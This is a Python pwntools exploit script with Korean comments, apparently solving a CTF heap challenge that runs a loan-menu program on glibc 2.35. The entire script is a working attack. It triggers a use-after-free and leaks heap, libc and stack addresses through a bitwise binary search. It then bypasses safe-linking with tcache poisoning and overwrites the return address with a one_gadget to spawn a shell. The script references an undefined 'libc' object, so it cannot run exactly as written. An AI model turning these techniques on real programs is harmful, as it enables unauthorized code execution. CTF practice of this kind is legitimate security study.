from pwn import *

# =====================================================================
# [TODO] 디버깅하며 맞춰야 할 로컬 오프셋 2가지!
# 1. main_arena_offset: unsorted bin의 fd가 가리키는 main_arena+96 오프셋
# 2. ret_offset: environ 주소부터 main 함수의 리턴 주소까지의 거리
# =====================================================================
main_arena_offset = 0x219ce0 # Ubuntu 22.04 glibc 2.35 기본 (다를 수 있음)
ret_offset = -0x128          # GDB에서 x/gx environ 한 뒤, info frame으로 계산
one_gadget_offset = 0xebcf1  # 2.35 원가젯 오프셋 (ebcf1, ebcf5, ebcf8)
# =====================================================================

context.log_level = 'debug'
context.arch = 'amd64'

# p = process('./prob')
p = remote('127.0.0.1', 8000)

def register(name, pw):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"index: ", b"0")
    p.sendafter(b"name: ", name)
    p.sendafter(b"password: ", pw)

def login(pw):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"index: ", b"0")
    p.sendafter(b"password: ", pw)

def loan_meso(idx, loan_pw, is_uaf=False, money=0):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.send(loan_pw[:4]) # 딱 4바이트만 전송
    if not is_uaf:
        p.sendlineafter(b"money: ", str(money).encode())

def loan_more(idx, amount, pw=b"AAAA"):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendlineafter(b"money: ", str(amount).encode())
    p.send(pw[:4]) # fd의 상위 32비트 전송

def leak_32bit(idx):
    leaked_val = 0
    log.info(f"[*] Binary searching 32-bit leak for index {idx}...")
    for i in range(31, -1, -1):
        test_val = leaked_val | (1 << i)
        
        p.sendlineafter(b"> ", b"5")
        p.sendlineafter(b"index: ", str(idx).encode())
        p.sendlineafter(b"money: ", str(test_val).encode())
        
        # [핵심 수정] 줄바꿈을 기다리지 않고 둘 중 하나가 나오면 바로 리턴!
        res = p.recvuntil([b"nope\n", b"loan password: "])
        
        if b"loan password:" in res:
            leaked_val = test_val
            # read(0, buf, 4)이므로 딱 4바이트만 쏴주면 대기 없이 넘어갑니다.
            p.send(b"wrng") 
        else:
            # nope\n 이 뜬 경우 (비트가 0이어야 함)
            pass
            
    return leaked_val

# -------------------------------------------------------------------------
log.info("[1] 계정 세팅 및 힙 베이스 릭")
register(b"A"*0x10, b"AAAA")
login(b"AAAA")

# loan_meso(0)는 0x600 할당
loan_meso(0, b"BBBB") 
loan_meso(0, b"AAAA", is_uaf=True) # AAAA(계정비번) 입력으로 UAF 트리거

safe_linked_fd = leak_32bit(0)
heap_base = safe_linked_fd << 12
log.success(f"[!] Heap Base: {hex(heap_base)}")

# Tcache 비우기 (0x600 소모)
loan_meso(1, b"BBBB")

# -------------------------------------------------------------------------
log.info("[2] Unsorted Bin 세팅 (Libc 릭 준비)")
# 0x700 ~ 0xe00 까지 순차 할당
for i in range(10, 18):
    loan_meso(i, b"BBBB")

# 정상 상환하여 해제 (17번 청크 0xe00은 Unsorted Bin으로 들어감)
for i in range(10, 18):
    p.sendlineafter(b"> ", b"5")
    p.sendlineafter(b"index: ", str(i).encode())
    p.sendlineafter(b"money: ", b"0")

unsorted_chunk = heap_base + 0xe00

# -------------------------------------------------------------------------
log.info("[3] 1차 Tcache Poisoning -> Libc Base 릭")
# Tcache 최상단 2개 (0xd00, 0xc00) 사용
loan_meso(2, b"BBBB") # 0xd00
loan_meso(3, b"BBBB") # 0xc00

# UAF로 해제
loan_meso(2, b"AAAA", is_uaf=True) 
loan_meso(3, b"AAAA", is_uaf=True) 

target_array = heap_base + 0x4f0 # Loan Array 위치
this_chunk = heap_base + 0xc00
next_chunk = heap_base + 0xd00

# Safe-Linking 계산 마법
current_fd = next_chunk ^ (this_chunk >> 12)
desired_fd = target_array ^ (this_chunk >> 12)
diff = (desired_fd - current_fd) & 0xffffffff
pass_val = p32((current_fd >> 32) & 0xffffffff)

loan_more(3, diff, pass_val) # fd 덮어쓰기

# 두 번 할당하여 target_array 획득!
loan_meso(4, b"BBBB")
# 이 할당은 loan_array[0] 구조체 위치를 덮어씁니다! 
money_val = unsorted_chunk & 0xffffffff
loan_pw_val = p32((unsorted_chunk >> 32) & 0xffffffff)
loan_meso(5, loan_pw_val, money=money_val) 

# 이제 loan_array[0]은 unsorted bin을 가리킵니다.
libc_lower_32 = leak_32bit(0)
libc_base_lower = (libc_lower_32 - (main_arena_offset + 96)) & 0xffffffff
libc_base = 0x7ffff7000000 | libc_base_lower # Ubuntu 기본 Libc 상위 바이트
log.success(f"[!] Libc Base: {hex(libc_base)}")

# -------------------------------------------------------------------------
log.info("[4] 2차 Tcache Poisoning -> Stack Base (environ) 릭")
loan_meso(6, b"BBBB") # 0xb00
loan_meso(7, b"BBBB") # 0xa00
loan_meso(6, b"AAAA", is_uaf=True)
loan_meso(7, b"AAAA", is_uaf=True)

this_chunk = heap_base + 0xa00
next_chunk = heap_base + 0xb00

current_fd = next_chunk ^ (this_chunk >> 12)
desired_fd = target_array ^ (this_chunk >> 12)
diff = (desired_fd - current_fd) & 0xffffffff
pass_val = p32((current_fd >> 32) & 0xffffffff)

loan_more(7, diff, pass_val)
loan_meso(8, b"BBBB")

# environ 주소를 배열에 쓰기
environ_addr = libc_base + libc.symbols['environ']
money_val = environ_addr & 0xffffffff
loan_pw_val = p32((environ_addr >> 32) & 0xffffffff)
loan_meso(9, loan_pw_val, money=money_val)

stack_lower_32 = leak_32bit(0)
stack_addr = 0x7ffe00000000 | stack_lower_32 # Ubuntu 기본 Stack 상위 바이트
log.success(f"[!] Stack Base: {hex(stack_addr)}")

# -------------------------------------------------------------------------
log.info("[5] 3차 Tcache Poisoning -> Return Address 조작 (One Gadget!)")
ret_addr_loc = stack_addr + ret_offset

loan_meso(20, b"BBBB") # 0x900
loan_meso(21, b"BBBB") # 0x800
loan_meso(20, b"AAAA", is_uaf=True)
loan_meso(21, b"AAAA", is_uaf=True)

this_chunk = heap_base + 0x800
next_chunk = heap_base + 0x900

current_fd = next_chunk ^ (this_chunk >> 12)
desired_fd = target_array ^ (this_chunk >> 12)
diff = (desired_fd - current_fd) & 0xffffffff
pass_val = p32((current_fd >> 32) & 0xffffffff)

loan_more(21, diff, pass_val)
loan_meso(22, b"BBBB")

# Return Address 위치를 배열에 쓰기
money_val = ret_addr_loc & 0xffffffff
loan_pw_val = p32((ret_addr_loc >> 32) & 0xffffffff)
loan_meso(23, loan_pw_val, money=money_val)

# Return Address 하위 32비트에 (원가젯 - 현재리턴주소) 차이값 더하기
one_gadget_addr = libc_base + one_gadget_offset
current_ret_val = libc_base + 0x29d90 # __libc_start_main_ret 예상 주소 (GDB 확인 필요)

diff_ret = (one_gadget_addr - current_ret_val) & 0xffffffff
# UAF된 청크가 아니므로 password 검증은 정상 4바이트로 통과시킴
loan_more(0, diff_ret, b"BBBB")

log.success("[!] Overwrote Return Address! Exiting to trigger Shell...")
p.sendlineafter(b"> ", b"6") # Exit triggering return
p.interactive()